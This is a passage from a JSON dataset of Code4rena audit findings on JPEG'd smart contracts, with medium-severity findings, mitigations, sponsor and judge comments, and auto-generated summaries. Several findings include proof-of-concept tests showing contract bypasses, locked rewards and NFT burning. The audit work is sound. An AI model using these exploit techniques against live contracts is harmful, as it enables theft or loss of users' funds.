      "content": "_Submitted by Wayne, also found by hyh, PPrieditis, rayn, smiling_heretic, and Cr4ckM3_\n\n[yVault.sol#L61](https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/vaults/yVault/yVault.sol#L61)<br>\n[yVaultLPFarming.sol#L54](https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/farming/yVaultLPFarming.sol#L54)<br>\n\nThe expectation of the noContract modifier is to allow access only to accounts inside EOA or Whitelist, if access is controlled using ! access control with \\_account.isContract(), then because isContract() gets the size of the code length of the account in question by relying on extcodesize/address.code.length, this means that the restriction can be bypassed when deploying a smart contract through the smart contract's constructor call.\n\n### Recommended Mitigation Steps\n\nModify the code to `require(msg.sender == tx.origin);`\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with Medium severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1095292333):**\n > The observations made in the issue are correct, but given how impractical it would be to make an autocompounder that bypasses the `noContract` modifier this issue should probably be severity 0. It's worth mentioning that this behaviour was already known as outlined in the modifier's documentation.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1099249484):**\n > Fixed in [jpegd/core#17](https://github.com/jpegd/core/pull/17).\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1109971129):**\n > I'm going to let this stand. Impractical or not, this is very easily exploited.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a smart contract system. The expectation of the noContract modifier is to allow access only to accounts inside EOA or Whitelist, however, access can be bypassed when deploying a smart contract through the smart contract's constructor call. This is due to the restriction relying on extcodesize/address.code.length. The proof of concept for this vulnerability is provided in the form of direct links to the relevant code in GitHub. The recommended mitigation step is to modify the code to require(msg.sender == tx.origin).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/11",
      "tags": [],
      "finders": [
        "PPrieditis",
        "smilingheretic",
        "rayn",
        "Cr4ckM3_",
        "hyh",
        "Wayne"
      ]
    },
    {
      "id": "1923",
      "title": "[M-08] `_swapUniswapV2` may use an improper `path` which can cause a loss of the majority of the rewardTokens",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n[StrategyPUSDConvex.sol#L311-L334](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L311-L334)<br>\n\n```solidity\nfunction harvest(uint256 minOutCurve) external onlyRole(STRATEGIST_ROLE) {\n    convexConfig.baseRewardPool.getReward(address(this), true);\n\n    //Prevent `Stack too deep` errors\n    {\n        DexConfig memory dex = dexConfig;\n        IERC20[] memory rewardTokens = strategyConfig.rewardTokens;\n        IERC20 _weth = weth;\n        for (uint256 i = 0; i < rewardTokens.length; i++) {\n            uint256 balance = rewardTokens[i].balanceOf(address(this));\n\n            if (balance > 0)\n                //minOut is not needed here, we already have it on the Curve deposit\n                _swapUniswapV2(\n                    dex.uniswapV2,\n                    rewardTokens[i],\n                    _weth,\n                    balance,\n                    0\n                );\n        }\n\n        uint256 wethBalance = _weth.balanceOf(address(this));\n        require(wethBalance > 0, \"NOOP\");\n        ...\n```\n\n[StrategyPUSDConvex.sol#L410-L430](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L410-L430)<br>\n\n```solidity\n function _swapUniswapV2(\n    IUniswapV2Router router,\n    IERC20 tokenIn,\n    IERC20 tokenOut,\n    uint256 amountIn,\n    uint256 minOut\n) internal {\n    tokenIn.safeIncreaseAllowance(address(router), amountIn);\n\n    address[] memory path = new address[](2);\n    path[0] = address(tokenIn);\n    path[1] = address(tokenOut);\n\n    router.swapExactTokensForTokens(\n        amountIn,\n        minOut,\n        path,\n        address(this),\n        block.timestamp\n    );\n}\n```\n\nIn the current implementation, `rewardTokens` from the underlying strategy will be swapped to `weth` first then `weth` -> `usdc`.\n\nHowever, the `path` used for swapping from `rewardToken` -> `weth` is hardcoded as `[rewardToken, weth]`, which may not be the optimal route.\n\nFor example, the majority liquidity for a particular `rewardToken` may actually be in the `rewardToken/USDC` pool. Swapping through the `rewardToken/WETH` with low liquidity may end up getting only a dust amount of WETH.\n\n### Recommended Mitigation Steps\n\nConsider allowing the admin to set a path for the rewardTokens.\n\n**[spaghettieth (JPEG'd) disputed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/157#issuecomment-1098388022):**\n > As of now, the one in the contract is the optimal routing path.\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/157#issuecomment-1109923759):**\n > I think the warden has made a reasonable find and recommendation. The sponsor used the phrase 'as of now' in disputing the report, but the idea that it may not always be the optimal path is actually specifically what the report and its mitigation addresses. That said, external factors are required so moving it to medium severity.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a project hosted on Github. The code in question is for a contract called StrategyPUSDConvex.sol. This code is responsible for swapping reward tokens for WETH (Wrapped Ether) and then WETH for USDC (USD Coin). The problem is that the code hardcodes the path for the reward tokens to WETH, which may not be the most optimal route. This could result in only a dust amount of WETH being received for the reward tokens. The recommendation is to consider allowing the admin to set a path for the reward tokens.",
      "quality_score": 0,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/157",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1922",
      "title": "[M-07] Wrong calculation for `yVault` price per share if decimals != 18",
      "impact": "MEDIUM",
      "content": "_Submitted by berndartmueller_\n\nThe [yVault.getPricePerFullShare()](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L196) function calculates the price per share by multiplying with `1e18` token decimals with the assumption that the underlying token always has 18 decimals. `yVault` has the same amount of decimals as it's underlying token see ([yVault.decimals()](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L70))\n\nBut tokens don't always have `1e18` decimals (e.g. USDC).\n\n### Impact\n\nThe price per share calculation does not return the correct price for underlying tokens that do not have 18 decimals. This could lead to paying out too little or too much and therefore to a loss for either the protocol or the user.\n\n### Proof of Concept\n\nFollowing test will fail with the current implementation when the underlying vault token has 6 decimals:\n\n*NOTE: `units()` helper function was adapted to accept the desired decimals.*\n\n```typescript\nit.only(\"should mint the correct amount of tokens for tokens with 6 decimals\", async () => {\n  const DECIMALS = 6;\n\n  await token.setDecimals(DECIMALS);\n  expect(await yVault.decimals()).to.equal(DECIMALS);\n\n  expect(await yVault.getPricePerFullShare()).to.equal(0);\n  await token.mint(user1.address, units(1000, DECIMALS));\n  await token.connect(user1).approve(yVault.address, units(1000, DECIMALS));\n\n  await yVault.connect(user1).deposit(units(500, DECIMALS));\n  expect(await yVault.balanceOf(user1.address)).to.equal(units(500, DECIMALS));\n\n  await token.mint(strategy.address, units(500, DECIMALS));\n  expect(await yVault.getPricePerFullShare()).to.equal(units(2, DECIMALS));\n});\n```\n\nFails with following error: `AssertionError: Expected \"2000000000000000000\" to be equal 2000000`\n\n### Recommended mitigation steps\n\nUse vault `decimals()` instead of hardcoded `1e18` decimals.\n\n```solidity\nfunction getPricePerFullShare() external view returns (uint256) {\n    uint256 supply = totalSupply();\n    if (supply == 0) return 0;\n    return (balance() * (10**decimals())) / supply; // @audit-info use `decimals()` instead of hardcoded `1e18`\n}\n```\n\n**[spaghettieth (JPEG'd) disputed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/117#issuecomment-1097985902):**\n > The `yVault` contract has been designed to work with Curve LPs, which have 18 decimals\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/117#issuecomment-1109895569):**\n > I'm downgrading this to a medium risk but leaving it as valid. Any number of external factors could conspire to result in a non-18 decimal token being used in the future, at which point this code may have been forgotten. A better choice would be to do a decimal check.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the function getPricePerFullShare() in the yVault contract. The function calculates the price per share by multiplying with `1e18` token decimals with the assumption that the underlying token always has 18 decimals. However, tokens don't always have `1e18` decimals (e.g. USDC). This could lead to paying out too little or too much and therefore to a loss for either the protocol or the user. A proof of concept is provided to demonstrate the issue. The recommended mitigation step is to use the vault `decimals()` instead of hardcoded `1e18` decimals.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/117",
      "tags": [
        "Decimals"
      ],
      "finders": [
        "berndartmueller"
      ]
    },
    {
      "id": "1921",
      "title": "[M-06] Oracle data feed is insufficiently validated.",
      "impact": "MEDIUM",
      "content": "_Submitted by Jujic, also found by hickuphh3_\n\nPrice can be stale and can lead to wrong `answer` return value.\n\n### Proof of Concept\n\nOracle data feed is insufficiently validated. There is no check for stale price and round completeness. Price can be stale and can lead to wrong  `answer`  return value.\n\n```\nfunction _collateralPriceUsd() internal view returns (uint256) {\n        int256 answer = oracle.latestAnswer();\n        uint8 decimals = oracle.decimals();\n\n        require(answer > 0, \"invalid_oracle_answer\");\n\n        ...\n\n```\n\n[FungibleAssetVaultForDAO.sol#L105](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L105)<br>\n\n### Recommended Mitigation Steps\n\nValidate data feed\n\n```\nfunction _collateralPriceUsd() internal view returns (uint256) {\n\n(uint80 roundID, int256 answer, , uint256 timestamp, uint80 answeredInRound) = oracle.latestRoundData();\n   \n    require(answer > 0, \"invalid_oracle_answer\");\n    require(answeredInRound >= roundID, \"ChainLink: Stale price\");\n    require(timestamp > 0, \"ChainLink: Round not complete\");\n\n         ...\n\n```\n\n**[0xJPEG (JPEG'd) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1101687980):**\n > Can add validation for round not being complete yet and potentially for stale pricing.<br>\n> This should be medium risk, as shown in past contests [[1]](https://github.com/code-423n4/code423n4.com/blob/65f9f13b7502c264098fe65ab57e79fcf99e956d/_data/reports/2022-01-notional.md#m-01-usage-of-deprecated-chainlink-api-in-eip1271wallet) [[2]](https://github.com/code-423n4/code423n4.com/blob/61f7d00561352d0c312b7f516404840eb68c824e/_data/reports/2021-12-yetifinance.md#m-02-should-check-return-data-from-chainlink-aggregators) [[3]](https://github.com/code-423n4/code423n4.com/blob/582de04e5765ee1953d0f07968fcd46ee2204ac7/_data/reports/2021-05-fairside.md#m-09-should-check-return-data-from-chainlink-aggregators)\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1102902675):**\n > Fixed in [jpegd/core#9](https://github.com/jpegd/core/pull/9).\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1109875877):**\n > Agree with sponsor on the medium risk rating. An oracle with a bad value is by definition an external requirement.\n\n\n\n***\n\n",
      "summary": "\nThis bug report focuses on a vulnerability in a code written in the Solidity programming language. The code is located at the given GitHub repository and the vulnerability is found at line 105. The vulnerability is that the Oracle data feed is not sufficiently validated, leading to a potential situation where the price can be stale and the wrong answer is returned. This can lead to incorrect calculations and results. The recommended mitigation steps are to validate the data feed, which can be done by adding code to the function at line 105 to check for stale price and round completeness.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/54",
      "tags": [],
      "finders": [
        "hickuphh3",
        "Jujic"
      ]
    },
    {
      "id": "1920",
      "title": "[M-05] Rewards will be locked if user transfer directly to pool without using deposit function ",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L190\n\n\n## Vulnerability details\n\n## Impact\n###### LpFarming.sol\nreward will be locked in the farming, when user execute a direct transfer with lpToken to farm without using deposit  \n\n## Proof of Concept\n\"pls add this test to LpFarming.ts to check\" \n\n```\nit(\"a part of rewards can't be distributed if user execute a direct transfer to farm\", async() => {\n      // manual mine new block  \n      await network.provider.send(\"evm_setAutomine\", [false]);\n\n      // prepare \n      const attacker = bob;\n      await lpTokens[0].transfer(alice.address, units(1000));\n      await lpTokens[0].transfer(attacker.address, units(1000));\n      await lpTokens[0].connect(alice).approve(farming.address, units(1000));\n      await mineBlocks(1);\n\n      // attacker direct deposit lp token to the pool \n      await lpTokens[0].connect(attacker).transfer(farming.address, units(100));\n\n      // create new pool\n      await farming.add(10, lpTokens[0].address);\n      await mineBlocks(1);\n      expect(await farming.poolLength()).to.equal(1);\n\n      let pool = await farming.poolInfo(0);\n      expect(pool.lpToken).to.equal(lpTokens[0].address);\n      expect(pool.allocPoint).to.equal(10);\n\n      // create new epoch ==> balance of pool will be 1000 \n      let blockNumber = await ethers.provider.getBlockNumber();\n      await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);\n\n      // alice deposit \n      await farming.connect(alice).deposit(0, units(100));\n      await mineBlocks(1);\n\n      expect(await jpeg.balanceOf(farming.address)).to.equal(1000);\n\n      // when pool end, alice can just take 500 jpeg, and 500 jpeg will be locked in the contract forever !!!\n      await mineBlocks(13);\n      console.log(\"reward of alice: \", (await   farming.pendingReward(0, alice.address)).toString());\n      expect(await farming.pendingReward(0, alice.address)).to.equal(BigNumber.from('500'));\n    });\n```\nIn the test above, the attacker transfers 100 lpToken to the farm without using deposit function, and alice deposit 100 lpToken. Because the contract uses ```pool.lpToken.balanceOf(address(this))``` to get the total supply of lpToken in the pool, it will sum up 100 lpToken of attacker and 100 lpToken of alice. This will lead to the situation where Alice will only be able to claim 500 token (at epoch.endBlock), the rest will be locked in the pool forever. Not only with this pool, it also affects the following, a part of the reward will be locked in the pool when the farm end.\n\n## Tools Used\ntypescript \n\n## Recommended Mitigation Steps\nDeclare a new variable ```totalLPSupply``` to the struct ```PoolInfo```, and use it instead of ```pool.lpToken.balanceOf(address(this))```",
      "summary": "\nThis bug report is about a vulnerability in the LPFarming.sol contract, which can cause a part of rewards to be locked in the farming when a user executes a direct transfer with lpToken to the farm without using the deposit function. The proof of concept provided in the report shows how this vulnerability can be exploited. The tools used in the report are typescript. The recommended mitigation step to fix this vulnerability is to declare a new variable ```totalLPSupply``` to the struct ```PoolInfo```, and use it instead of ```pool.lpToken.balanceOf(address(this))```.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/19",
      "tags": [],
      "finders": [
        "TrungOre"
      ]
    },
    {
      "id": "1919",
      "title": "[M-04] setDebtInterestApr should accrue debt first",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L212\n\n\n## Vulnerability details\n\n## Impact\nThe `setDebtInterestApr` changes the debt interest rate without first accruing the debt.\nThis means that the new debt interest rate is applied retroactively to the unaccrued period on next `accrue()` call.\n\nIt should never be applied retroactively to a previous time window as this is unfair & wrong.\nBorrowers can incur more debt than they should.\n\n## Recommended Mitigation Steps\nCall `accrue()` first in `setDebtInterestApr` before setting the new `settings.debtInterestApr`.",
      "summary": "\nThis bug report describes a vulnerability in the NFTVault.sol file in the code-423n4/2022-04-jpegd repository. This vulnerability allows the debt interest rate to be changed without first accruing the debt, meaning the new debt interest rate is applied retroactively to the unaccrued period on the next `accrue()` call. This can lead to borrowers incurring more debt than they should, which is unfair and wrong. The recommended mitigation step is to call `accrue()` first in `setDebtInterestApr` before setting the new `settings.debtInterestApr`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/78",
      "tags": [],
      "finders": [
        "cmichel",
        "pedroais"
      ]
    },
    {
      "id": "1918",
      "title": "[M-03] reward will be locked in the farm if no LP join the pool at epoch.startBlock ",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L214\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L107\n\n\n## Vulnerability details\n\n## Impact\na part of reward tokens will be locked in the farming pool if no user deposits lpToken at the epoch.startBlock\n\n## Proof of Concept\n```\nit(\"a part of reward should be locked in farm if no LP join the pool at epoch.startBlock\", async() => {\n      // manual mine new block  \n      await network.provider.send(\"evm_setAutomine\", [false]);\n\n      // prepare \n      await lpTokens[0].transfer(alice.address, units(1000));\n      await lpTokens[0].connect(alice).approve(farming.address, units(1000));\n      await mineBlocks(1);\n\n      // create new pool\n      await farming.add(10, lpTokens[0].address);\n      await mineBlocks(1);\n      expect(await farming.poolLength()).to.equal(1);\n\n      let pool = await farming.poolInfo(0);\n      expect(pool.lpToken).to.equal(lpTokens[0].address);\n      expect(pool.allocPoint).to.equal(10);\n\n      // create new epoch ==> balance of pool will be 1000 \n      let blockNumber = await ethers.provider.getBlockNumber();\n      await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);\n\n      // skip the epoch.startBlock  \n      // it mean no one deposit lpToken to farm at this block \n      await mineBlocks(1);\n      expect(await jpeg.balanceOf(farming.address)).to.equal(1000);\n\n      // alice deposit \n      await farming.connect(alice).deposit(0, units(100));\n      await mineBlocks(1);\n\n      // skip the blocks to the end of epoch \n      await mineBlocks(13);\n\n      await farming.connect(alice).claim(0);\n      await mineBlocks(1);\n\n      console.log(\"reward of alice: \", (await jpeg.balanceOf(alice.address)).toString());\n      console.log(\"reward remain: \", await jpeg.balanceOf(farming.address));\n\n      // 100 jpeg will be locked in the pool forevers \n      expect(await jpeg.balanceOf(alice.address)).to.equal(900);\n      expect(await jpeg.balanceOf(farming.address)).to.equal(100);\n    }); \n```    \nIn the example above, I create an epoch from blockNumber + 1 to blockNumber + 11 with the reward for each block being 100JPEG. So, the total reward for this farm will be 1000JPEG. When I skip the epoch.startBlock and let Alice deposit 100 lpToken at the block right after, at the end of the farm (epoch.endBlock), the total reward of Alice is just 900JPEG, and 100JPEG still remains in the farming pool. Since there is no function for the admin (or users) to withdraw the remaining, 100JPEG will be stucked in the pool forever !!!    \n## Tools Used\ntypescript \n\n\n## Recommended Mitigation Steps\nAdd a new function for the admin (or user) to claim all rewards which remained in the pool when epoch.endTime has passed\n```\nfunction claimRemainRewardsForOwner() external onlyOwner {\n        require(\n            block.number > epoch.endBlock, \n            'epoch has not ended'\n        );\n        uint256 remain = jpeg.balanceOf(address(this));\n        jpeg.safeTransfer(msg.sender, remain);\n    }\n```",
      "summary": "\nThis bug report is about a vulnerability in the LPFarming.sol contract, which is part of the code-423n4/2022-04-jpegd repository. The vulnerability is that a part of reward tokens will be locked in the farming pool if no user deposits lpToken at the epoch.startBlock. This is demonstrated in the proof of concept code, which shows that if Alice deposits 100 lpToken at the block right after the epoch.startBlock, at the end of the farm (epoch.endBlock), the total reward of Alice is just 900JPEG, and 100JPEG still remains in the farming pool. Since there is no function for the admin (or users) to withdraw the remaining, 100JPEG will be stucked in the pool forever.\n\nThe recommended mitigation step for this vulnerability is to add a new function for the admin (or user) to claim all rewards which remained in the pool when epoch.endTime has passed. The code for this new function is provided in the bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/14",
      "tags": [],
      "finders": [
        "TrungOre"
      ]
    },
    {
      "id": "1917",
      "title": "[M-02] NFTHelper Contract Allows Owner to Burn NFTs",
      "impact": "MEDIUM",
      "content": "_Submitted by Kenshin_\n\n[CryptoPunksHelper.sol#L38](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L38)<br>\n[CryptoPunksHelper.sol#L52](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L52)<br>\n\nIn the NFT helper contract, there is no validation on that the receiver address must not be address zero. Therefore, it allows owner or an attacker who gain access to the owner address to burn NFTs forever through the functions by transferring the NFTs to address zero.\n\n### Proof of Concept\n\nThe PoC is originally conducted using foundry. However, it isn't that complicated so I rewrote it in TypeScipt as well, the team can easily proof this by including in the `CryptoPunksHelper.ts`.\n\n#### TypeScript\n\n    // add `.only` to run only this test, not all.\n    it.only(\"allows the owner to burn nfts\", async () => {\n        // safeTransferFrom\n        await cryptoPunks.getPunk(1);\n        await cryptoPunks.transferPunk(helper.address, 1);\n        await helper.safeTransferFrom(owner.address, ZERO_ADDRESS, 1);\n        expect(await cryptoPunks.punkIndexToAddress(1)).to.equal(ZERO_ADDRESS);\n        expect(await helper.ownerOf(1)).to.equal(ZERO_ADDRESS);\n\n        // transferFrom\n        await cryptoPunks.getPunk(2);\n        await cryptoPunks.transferPunk(helper.address, 2);\n        await helper.transferFrom(owner.address, ZERO_ADDRESS, 2);\n        expect(await cryptoPunks.punkIndexToAddress(2)).to.equal(ZERO_ADDRESS);\n        expect(await helper.ownerOf(2)).to.equal(ZERO_ADDRESS);\n      });\n\n#### Foundry\n\n    pragma solidity ^0.8.0;\n\n    // for test\n    import \"ds-test/test.sol\";\n    import \"forge-std/Vm.sol\";\n\n    // contracts\n    import \"../test/CryptoPunks.sol\";\n    import \"../helpers/CryptoPunksHelper.sol\";\n\n    contract CryptoPunksHelperTest is DSTest {\n        Vm constant vm = Vm(HEVM_ADDRESS);\n        \n        address owner = address(1);\n        address user = address(2);\n        \n        CryptoPunks private cps;\n        CryptoPunksHelper private helper;\n\n        function setUp() public {\n            vm.startPrank(owner);\n            cps = new CryptoPunks();\n            helper = new CryptoPunksHelper();\n            helper.initialize(address(cps));\n            vm.stopPrank();\n        }\n\n        function testOwnerTransferToZero() public {\n            //make sure address zero hold no punks\n            assertEq(cps.balanceOf(address(0)), 0);\n\n            // safeTransferFrom PoC\n            vm.startPrank(owner);\n            cps.getPunk(1);\n            cps.transferPunk(address(helper), 1);\n            helper.safeTransferFrom(owner, address(0), 1);\n            assertEq(cps.punkIndexToAddress(1), address(0));\n            assertEq(helper.ownerOf(1), address(0));\n            assertEq(cps.balanceOf(address(0)), 1);\n\n            // transferFrom PoC\n            cps.getPunk(2);\n            cps.transferPunk(address(helper), 2);\n            helper.transferFrom(owner, address(0), 2);\n            assertEq(cps.punkIndexToAddress(2), address(0));\n            assertEq(helper.ownerOf(2), address(0));\n            assertEq(cps.balanceOf(address(0)), 2);\n        }\n    }\n\nfoundry.toml\n\n    [default]\n    src = \"contracts\"\n    libs = [\"lib/forge-std/lib\", \"lib/\", \"node_modules\"]\n    solc_version = \"0.8.0\"\n    optimizer = false\n    fuzz_runs = 100000\n    test = \"foundryTest\"\n\n### Tools Used\n\n*   Foundry\n*   Hardhat\n\n### Recommended Mitigation Steps\n\nEven the functions are restricted for only the owner, the zero address should not be allowed as the receiver address.\n\n**[spaghettieth (JPEG'd) acknowledged and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/47#issuecomment-1095518421):**\n > The sole purpose of `CryptoPunksHelper.sol` and `EtherRocksHelper.sol` contracts is to allow compatibility of non ERC721 NFTs to be compatible with `NFTVault.sol` without having to modify the vault's code. They don't have to provide any additional security check outside of compatibility related ones, everything else is out of scope and should be handled by the underlying NFT.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the NFT helper contract. The vulnerability allows the owner or an attacker who gains access to the owner address to burn NFTs forever through the functions by transferring the NFTs to address zero. This was proven using Foundry and Hardhat tools, and the code was rewritten in TypeScript. The recommended mitigation step is to make sure that the zero address is not allowed as the receiver address, even though the functions are restricted for only the owner.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/47",
      "tags": [],
      "finders": [
        "Kenshin"
      ]
    },
    {
      "id": "1916",
      "title": "[M-01] When _lpToken is jpeg, reward calculation is incorrect",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz, also found by minhquanym_\n\nIn the LPFarming contract, a new staking pool can be added using the add() function. The staking token for the new pool is defined using the \\_lpToken variable. However, there is no additional checking whether the \\_lpToken is the same as the reward token (jpeg) or not.\n\n        function add(uint256 _allocPoint, IERC20 _lpToken) external onlyOwner {\n            _massUpdatePools();\n\n            uint256 lastRewardBlock = _blockNumber();\n            totalAllocPoint = totalAllocPoint + _allocPoint;\n            poolInfo.push(\n                PoolInfo({\n                    lpToken: _lpToken,\n                    allocPoint: _allocPoint,\n                    lastRewardBlock: lastRewardBlock,\n                    accRewardPerShare: 0\n                })\n            );\n        }\n\nWhen the \\_lpToken is the same token as jpeg, reward calculation for that pool in the updatePool() function can be incorrect. This is because the current balance of the \\_lpToken in the contract is used in the calculation of the reward. Since the \\_lpToken is the same token as the reward, the reward minted to the contract will inflate the value of lpSupply, causing the reward of that pool to be less than what it should be.\n\n        function _updatePool(uint256 _pid) internal {\n            PoolInfo storage pool = poolInfo[_pid];\n            if (pool.allocPoint == 0) {\n                return;\n            }\n\n            uint256 blockNumber = _blockNumber();\n            //normalizing the pool's `lastRewardBlock` ensures that no rewards are distributed by staking outside of an epoch\n            uint256 lastRewardBlock = _normalizeBlockNumber(pool.lastRewardBlock);\n            if (blockNumber <= lastRewardBlock) {\n                return;\n            }\n            uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n            if (lpSupply == 0) {\n                pool.lastRewardBlock = blockNumber;\n                return;\n            }\n            uint256 reward = ((blockNumber - lastRewardBlock) *\n                epoch.rewardPerBlock *\n                1e36 *\n                pool.allocPoint) / totalAllocPoint;\n            pool.accRewardPerShare = pool.accRewardPerShare + reward / lpSupply;\n            pool.lastRewardBlock = blockNumber;\n        }\n\n### Proof of Concept\n\n[LPFarming.sol#L141-L154](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L141-L154)<br>\n[LPFarming.sol#L288-L311](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L288-L311)<br>\n\n### Recommended Mitigation Steps\n\nAdd a check that \\_lpToken is not jpeg in the add function or mint the reward token to another contract to prevent the amount of the staked token from being mixed up with the reward token.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/1)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/1#issuecomment-1099231224):**\n > Fixed in [jpegd/core#2](https://github.com/jpegd/core/pull/2).\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the LPFarming contract of the 2022-04-jpegd repository on GitHub. This bug has the potential to cause an incorrect reward calculation for a new pool added to the contract. The add() function in the contract allows a new staking pool to be added, and the staking token for the pool is defined using the _lpToken variable. However, no additional checking is done to ensure that the _lpToken is the same as the reward token (jpeg). If the _lpToken is the same token as the reward, the reward minted to the contract will inflate the value of lpSupply, causing the reward of that pool to be less than what it should be. \n\nTo mitigate this issue, a check should be added to the add() function to ensure that the _lpToken is not the same as the reward token. Alternatively, the reward token can be minted to a different contract to prevent the amount of the staked token from being mixed up with the reward token.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/1",
      "tags": [],
      "finders": [
        "cccz",
        "minhquanym"
      ]
    },
    {
      "id": "1915",
      "title": "[H-09] Bad debts should not continue to accrue interest",
      "impact": "HIGH",
